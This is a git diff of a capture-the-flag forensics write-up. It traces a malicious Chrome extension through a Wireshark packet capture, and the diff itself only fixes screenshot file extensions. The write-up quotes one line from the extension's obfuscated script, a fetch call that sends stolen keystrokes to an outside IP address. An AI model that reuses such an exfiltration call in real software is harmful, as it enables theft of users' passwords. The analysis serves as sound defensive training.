@@ -19,7 +19,7 @@ When analyzing PCAP files using Wireshark, it is helpful to look at the **Statis
 
 I started looking at the HTTP web requests, found under **Statistics > HTTP > Requests**. This shows a list of all HTTP requests by destination address along with what was requested. 
 
-![HTTP requests](../screenshots/xtension_http_requests)
+![HTTP requests](../screenshots/xtension_http_requests.PNG)
 
 We have two interesting findings:
 * FunnyCatPicsExtension.crx (Google Chrome extension)
@@ -28,7 +28,7 @@ We have two interesting findings:
 <br> **Examining the CRX file:** <br>
  I exported the the CRX file from the PCAP (**File > Export Objects > HTTP** then select the file you want to Save) but the file type couldn't be directly opened in Kali Linux. I used [CRX Extractor](https://crxextractor.com/) to convert the CRX file to a ZIP to dig into the contents.
 
-![CRX to ZIP](../screenshots/xtension_funnycatzip)
+![CRX to ZIP](../screenshots/xtension_funnycatzip.PNG)
 
  The **contents.js** file is heavily objuscated code with this interesting snippet: `fetch('http://192.9.137.137:42552/?t=` which relates to the other HTTP requests found before.
 
@@ -39,7 +39,7 @@ Admittedly I copy/pasted this code into Google Gemini to understand what it does
 <br> **Pivoting back to Wireshark:** <br>
 Knowing that we have passwords being exfilttrated via web requests, I went back to Wireshark to find the relevant packets. Using the display filter **http.request.method=="GET"** lists the GET requests (or keystrokes) in order.
 
-![GET requests](../screenshots/xtension_GETrequests)
+![GET requests](../screenshots/xtension_GETrequests.PNG)
 
 <br> **Decrypting the data:** <br>
 Now we have the exfiltrated keystrokes in order: 5e 54 43 51 4c 52 4f 43 52 59 44 5e 58 59 44 68 5a 5e 50 5f 43 68 5d 42 44 43 68 44 42 54 5c 4a
